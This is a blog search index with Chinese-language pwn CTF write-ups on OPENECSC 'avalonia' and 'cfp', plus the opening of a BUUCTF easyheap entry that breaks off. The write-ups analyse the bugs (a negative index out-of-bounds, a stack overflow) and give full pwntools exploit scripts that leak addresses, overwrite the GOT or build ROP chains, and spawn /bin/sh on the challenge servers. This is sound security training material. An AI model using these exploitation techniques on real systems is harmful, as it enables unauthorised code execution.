<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025-10-02-OPENECSC-avalonia</title>
    <link href="/2025/10/07/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/"/>
    <url>/2025/10/07/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>ctftime上的OPENECSC比赛题，链接：<a href="https://openec.sc/#challenges">OPENECSC:avalonia</a><br></p><span id="more"></span><p>这道题感觉漏洞点比较隐蔽，泄露地址的思路感觉也比较偏门，还融合了覆写GOT表和one gadget手法，都是目前不熟悉的<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>checksec，看到保护基本全开，除了GOT表是Partial：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/checksec.png"><br>IDA反编译，先看main函数，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-main.png"><br>先看函数表，没有malloc和free，首先排除堆题可能<br><br>菜单程序，逐步分析每个功能，先看添加部分：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_add_note.png"><br>只有一个输入的地方，允许输入156字节，但够不到返回地址，没有栈溢出，然后跟进add_note：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-add_note.png"><br>发现首先把我们的输入拷贝到一个bss段上的指针notePtr_+4的位置，然后前4个字节写入当前时间戳，最后把指针存到bss段上的一个指针数组noteptrs处<br><br>传入的参数最多只有156字节，notePtr_预留的有156+4刚好160字节，没有溢出，同时在notePtr_的末尾手动添加0x00，因此这里也没有明显可以溢出的地方<br><br>再看edit功能：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_edit_note.png"><br>首先让我们输入要修改的note下标，然后同样是fgets限制在156字节，然后进入edit_note：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-edit_note.png"><br>表面上看貌似没有可以溢出的地方，但是看到有用下标索引的动作，而且有一个自定义的读取下标函数，考虑是否存在下标越界错误？<br><br>跟进get_index：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-get_index.png"><br>看到首先从scanf读取4个字节的整数，即一个int，然后会调用check_index检查下标是否合法，跟进check_index：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-check_index.png"><br>看上去也没什么问题，保证不会超过10个note，而notes预留的大小正好是1600字节<br><br>于是先往下看view功能，输出功能一般来说是不可能存在溢出点的，因此主要寻找泄露地址的机会：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_view_note.png"><br>看到view会首先用get_index读取要显示的note的下标，然后把时间戳转换成time结构体输出，接着从+4处取note内容输出<br><br>get_index不会超过10，没有越界，因此看上去也没有泄露地址的机会<br><br>最后看delete功能：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_delete_note.png"><br>和edit以及view一样，从get_index读取要删除的坐标，然后把noteptrs对应位置置空<br><br>分析下来发现好像根本没有漏洞点，但其实我的分析遗漏了一个地方：下标不能超过9，但是下标可以为负数吗？如果可以，那就能在低于noteptrs的空间实现任意地址读写<br><br>而再次回头来检查get_index和check_index函数，发现只存在对下标是否不超过9的校验，而没有对是否大于0的校验<br><br>至此，漏洞点明确了，即在edit和view功能中，由于下标可以为负数，导致存在noteptrs以下地址空间的任意读和写<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>拿到任意地址读写以后，结合checksec的结果，可以想到改掉某个函数的GOT表；注意view函数的如下部分：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-view-detail.png"><br>由于notePtr_+4的内容是我们可控的，因此想到可以覆盖puts的GOT表<br><br>接下来是泄露地址的问题，首先需要泄露libc地址，因此要先在某个libc函数的GOT表处完成任意读，即让notePtr_等于某个函数的GOT段地址<br><br>但是开启了PIE保护，我们只知道got段的偏移，于是要先泄露程序装载基地址<br><br>但是哪个地址存储了一个和程序区段有关的地址呢？这里只能通过gdb调试去猜测，大概范围是noteptrs往上1600字节之前（即notes之前，因为notes预留了1600字节，而且肯定不在bss段——初始化全0）<br><br>最后在noteptrs上方210*8个字节处找到一个和程序段固定偏移的地址，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/find-elf.png"><br>之后只要调用view功能越界读这块内存即可，代码如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#noteptrs-210*8的位置有一个程序内部固定偏移（0x4050）的地址，gdb调试获得</span><br>elfBase=LeakAddr(-<span class="hljs-number">210</span>)-<span class="hljs-number">0x4050</span><br></code></pre></td></tr></table></figure><p>之后是泄露libc地址，具体思路是首先把puts函数GOT表的地址放在noteptrs上方的某个可控地址空间，其实可以放到notes附近，这部分对应的代码如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">Add(<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>libcBase=LeakAddr(-<span class="hljs-number">199</span>)-libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br></code></pre></td></tr></table></figure><p>拿到libc地址之后，首先布置好一个”&#x2F;bin&#x2F;sh”字符串的参数，之后将puts函数GOT表-4的值同样布置到notes附近，最后调用Edit完成覆盖，如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Add(<span class="hljs-string">&quot;/bin/sh&quot;</span>)  <span class="hljs-comment">#1号位置填好参数/bin/sh</span><br><span class="hljs-comment">#覆盖puts的GOT表</span><br>Add(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]-<span class="hljs-number">4</span>))<br>Edit(-<span class="hljs-number">159</span>,p64(libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>])) <br></code></pre></td></tr></table></figure><p>最后调用一次View，输出1号下标的&#x2F;bin&#x2F;sh，实际就会执行system(“&#x2F;bin&#x2F;sh”)<br><br>完整exp如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timezone<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./app&quot;</span><br>libcPath=<span class="hljs-string">&quot;/home/k40/Pwn/Exercise/OPENECSC-avalonia/libc.so.6&quot;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br>mode=REMOTE<br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>():<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;89383b86-6177-4e66-8113-0770b7acd413.openec.sc&quot;</span>,<span class="hljs-number">31337</span>,ssl=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF,<span class="hljs-string">&quot;b *do_view_note+376&quot;</span>)<br>        <span class="hljs-keyword">return</span> io<br><br>ioTube=Lauch()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">content_</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter note content &gt; &quot;</span>)<br>    ioTube.sendline(content_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Edit</span>(<span class="hljs-params">idx,content_</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter index of note to edit &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-built_in">str</span>(idx))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter note content: &quot;</span>)<br>    ioTube.sendline(content_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Delete</span>(<span class="hljs-params">idx</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    ioTube.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">View</span>(<span class="hljs-params">idx</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter index of note to view &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-built_in">str</span>(idx))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Modified on &quot;</span>)<br>    times_=ioTube.recvline(keepends=<span class="hljs-literal">False</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Content: \&quot;&quot;</span>)<br>    content_=ioTube.recvline(keepends=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> content_,times_<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">LeakAddr</span>(<span class="hljs-params">idx</span>):<br>    content_,times_=View(idx)<br>    epoch32 = <span class="hljs-built_in">int</span>(datetime.strptime(times_.decode(), <span class="hljs-string">&quot;%d/%m/%Y %I:%M:%S %p&quot;</span>).replace(tzinfo=timezone.utc).timestamp()) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment">#取前4个字节</span><br>    note_val = <span class="hljs-built_in">int</span>.from_bytes(content_, <span class="hljs-string">&quot;little&quot;</span>)  <span class="hljs-comment">#后4个字节</span><br>    <span class="hljs-keyword">return</span> (note_val &lt;&lt; <span class="hljs-number">32</span>) | epoch32  <span class="hljs-comment">#拼接=一个8字节地址</span><br><br><span class="hljs-comment">#noteptrs-210*8的位置有一个程序内部固定偏移（0x4050）的地址，gdb调试获得？</span><br>elfBase=LeakAddr(-<span class="hljs-number">210</span>)-<span class="hljs-number">0x4050</span><br><br>Add(<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>libcBase=LeakAddr(-<span class="hljs-number">199</span>)-libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>Add(<span class="hljs-string">&quot;/bin/sh&quot;</span>)  <span class="hljs-comment">#1号位置填好参数/bin/sh</span><br><span class="hljs-comment">#覆盖puts的GOT表</span><br>Add(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]-<span class="hljs-number">4</span>))<br>Edit(-<span class="hljs-number">159</span>,p64(libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]))  <br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter index of note to view &gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
      <category>覆写GOT表</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025-10-02-OPENECSC-cfp</title>
    <link href="/2025/10/03/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/"/>
    <url>/2025/10/03/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>OPENECSC pwn第一题，详见<a href="https://openec.sc/#challenges">OPENECSC-cfp</a><br></p><span id="more"></span><p>学到的一种新的泄露地址的方法，记录一下</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec，看到没开canary，其他都开了：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/checksec.png"><br>进入IDA，发现溢出点在main函数的fgets，允许我们输入256字节，可以覆盖到返回地址：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/IDA-main.png"><br>有puts函数，想到可以ret2libc<br><br>但是开了PIE，如果采用二阶段打法，先调puts泄露libc地址，需要泄露elf的基地址才能用gadget去控rdi，或者用别的办法泄露libc<br><br>进一步分析发现admin_func里存在输出功能，如下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/IDA-admin_func.png"><br>user_func也类似：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/IDA-user_func.png"><br>这里学到一种新的思路：未初始化（memset）的情况下，栈上有可能残留和ELF相关的真实地址，于是调试分析一下<br><br>最终可以看到，在admin_func输出之前，栈上确实有一个ELF的真实地址：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/pwndbg-stack.png"><br>因此利用思路为ret2libc，难点在于泄露地址，解决方法就是找一个在printf之前固定会有的的地址，通过溢出控制最后0x00截断的位置刚好到那里，类似下图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/leak-location.png"><br>可以看到倒数第二行固定有一个ELF文件地址，偏移是0x11a9，这个值是固定的，只要泄露该地址-0x11a9就能得到ELF地址进而得到gadget，然后就是常规的二阶段打法ret2libc了<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>exp如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./app&quot;</span><br>libcPath=<span class="hljs-string">&quot;/home/k40/Pwn/Exercise/OPENECSC-cfp/libc.so.6&quot;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br>mode=REMOTE<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set debug-file-directory /home/k40/Pwn/glibc-tool/glibc-all-in-one/libs/glibc-2.23/.debug</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br>leakFuncName=<span class="hljs-string">&quot;puts&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>():<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;bf44ea4d-2baa-4449-8289-53b21ae5d766.openec.sc&quot;</span>,<span class="hljs-number">31337</span>,ssl=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF,<span class="hljs-string">&quot;b *main+55&quot;</span>)<br>        <span class="hljs-keyword">return</span> io<br><br>ioTube=Lauch()<br><br>retOffset=<span class="hljs-number">0x70</span>+<span class="hljs-number">0x8</span><br>libOffset=<span class="hljs-number">0x24083</span><br>elfOffset=<span class="hljs-number">0x11a9</span><br>gotOffset=elf.got[leakFuncName]<br>pltOffset=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><br><span class="hljs-keyword">if</span> mode==LOCAL <span class="hljs-keyword">or</span> mode==DEBUG:<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Hello functional world! Whats your name?&quot;</span>)<br>payload=<span class="hljs-string">b&quot;admin&quot;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*(retOffset-<span class="hljs-number">2</span>-<span class="hljs-number">5</span>)<br>ioTube.sendline(payload)<br><span class="hljs-keyword">if</span> mode==REMOTE:<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Hello functional world! Whats your name?&quot;</span>)<br>ioTube.recv(<span class="hljs-number">0x68</span>)<br>info=ioTube.recvuntil(<span class="hljs-string">&#x27;!&#x27;</span>)<br>elfLeak=u64(info[<span class="hljs-number">0x68</span>+<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>elfBase=elfLeak-elfOffset<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hello functional world! Whats your name?&quot;</span>)<br><br>putsGOT=elfBase+gotOffset<br>putsPLT=elfBase+pltOffset<br>pop_rdi_ret=elfBase+<span class="hljs-number">0x1323</span><br>retAlignPadding=elfBase+<span class="hljs-number">0x101a</span><br>backAddr=elfBase+elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>payload=<span class="hljs-string">b&#x27;1&#x27;</span>*retOffset+p64(pop_rdi_ret)+p64(putsGOT)+p64(putsPLT)+p64(backAddr)<br>ioTube.sendline(payload)<br>ioTube.recvuntil(<span class="hljs-string">&quot;bye!&quot;</span>)<br>ioTube.recvline()<br>libcLeak=u64(ioTube.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcBase=libcLeak-libc.symbols[leakFuncName]<br><br>systemAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hello functional world! Whats your name?&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;2&#x27;</span>*retOffset+p64(retAlignPadding)+p64(pop_rdi_ret)+p64(binshAddr)+p64(systemAddr)<br>ioTube.sendline(payload)<br>ioTube.recvuntil(<span class="hljs-string">&quot;bye!&quot;</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>最后值得提一下的是服务器端没有setbuf，因此交互行为和本地略有区别<br><br>以及服务端开启了SSL，因此remote接口也要加上ssl&#x3D;True的参数</p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>比赛题解</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-easyheap</title>
    <link href="/2025/10/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/"/>
    <url>/2025/10/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF一道堆题，链接见：<a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">BUUCTF：EasyHeap</a><br></p><span id="more"></span><p>主要通过这道题进一步了解覆写GOT表这种之前没怎么接触过的利用手法<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec，发现除了PIE全部开启，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/checksec.png"><br>之后进入IDA，发现是个菜单程序，同时存在malloc和free，是个堆题，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-main.png"><br>之后寻找溢出点，首先看到create功能：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/BUUCTF-easyheap/IDA-create.png"><br>然后对比观察edit功能，如图：<br><br><img 